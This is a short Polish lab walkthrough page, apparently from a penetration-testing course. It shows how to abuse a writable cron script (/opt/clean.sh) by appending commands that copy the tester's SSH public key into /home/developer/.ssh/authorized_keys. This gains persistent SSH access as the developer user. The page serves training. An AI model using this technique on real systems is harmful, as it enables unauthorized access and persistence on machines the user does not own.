---
title: "1.2p - Zadanie cron i klucz SSH"
order: 17
---

> **Uwaga do rozwiązania:** W oryginale autor zaznacza niepewność tego kroku. Najpierw sprawdź właściciela, uprawnienia i ścieżkę zadania cron. Repozytorium używa `/opt/clean.sh`, slajdy `/home/developer/clean.sh`. Zmiana zadziała dopiero po uruchomieniu zadania cron jako `developer`; nie jest to natychmiastowe wykonanie.

```bash
cat /etc/crontab
ls -l /opt/clean.sh
echo "mkdir -p /home/developer/.ssh" >> /opt/clean.sh
echo "echo $(cat /home/pentest/.ssh/authorized_keys) >> /home/developer/.ssh/authorized_keys" >> /opt/clean.sh
```
